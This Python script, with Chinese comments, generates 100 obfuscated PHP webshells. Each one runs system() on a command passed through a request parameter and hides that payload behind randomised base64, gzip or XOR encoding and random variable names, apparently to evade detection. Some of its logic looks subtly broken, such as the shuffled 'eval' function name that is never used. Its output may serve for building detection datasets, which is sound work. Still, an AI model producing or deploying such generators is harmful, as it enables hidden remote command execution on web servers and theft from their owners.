import os
import base64
import random
import string
import zlib
from pathlib import Path

def random_var(length=6):
    return ''.join(random.choices(string.ascii_letters, k=length))

def xor_encrypt(payload, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(payload))

def build_payload():
    # 生成执行请求参数的代码
    param = random.choice(["cmd", "c", "x"])
    payload = f"if(isset($_REQUEST['{param}'])){{ob_start();system($_REQUEST['{param}']);$output=ob_get_clean();echo $output;}}"

    if random.random() < 0.5:
        payload = base64.b64encode(payload.encode()).decode()
        return f"eval(base64_decode(\"{payload}\"));"
    elif random.random() < 0.5:
        raw_deflate = zlib.compress(payload.encode())[2:-4]
        payload_b64 = base64.b64encode(raw_deflate).decode()
        return f"eval(gzinflate(base64_decode(\"{payload_b64}\")));"
    else:
        key = random_var(4)
        encrypted = xor_encrypt(payload, key)
        hex_encoded = encrypted.encode().hex()
        decrypt_php = (
            f"$k=\"{key}\";$d='';$e=hex2bin(\"{hex_encoded}\");"
            f"for($i=0;$i<strlen($e);$i++){{ $d.=$e[$i]^$k[$i%strlen($k)]; }}eval($d);"
        )
        return decrypt_php

def generate_webshell():
    param = random.choice(["cmd", "c", "x"])
    
    payload_code = build_payload()
    fn_parts = random.sample("eval", len("eval"))
    fn_expr = '.'.join([f'"{c}"' for c in fn_parts])

    var_fn = random_var()
    var_data = random_var()
    var_decoded = random_var()

    template = f"""
<?php
${var_fn} = {fn_expr};
${var_data} = $_REQUEST['{param}'] ?? '';
if(strlen(${var_data}) > 0) {{
    ${var_decoded} = {payload_code}
}}
?>
"""
    return template

def generate_samples(count=100):
    # 创建输出目录
    out_dir = Path("/data/php_webshellv6")
    Path(out_dir).mkdir(parents=True, exist_ok=True)
    for i in range(count):
        php_code = generate_webshell()
        with open(os.path.join(out_dir, f"shell_{i}.php"), "w") as f:
            f.write(php_code)
    print(f"[+] Generated {count} advanced WebShell samples in {out_dir}")

def main():
    generate_samples(100)

if __name__ == "__main__":
    main()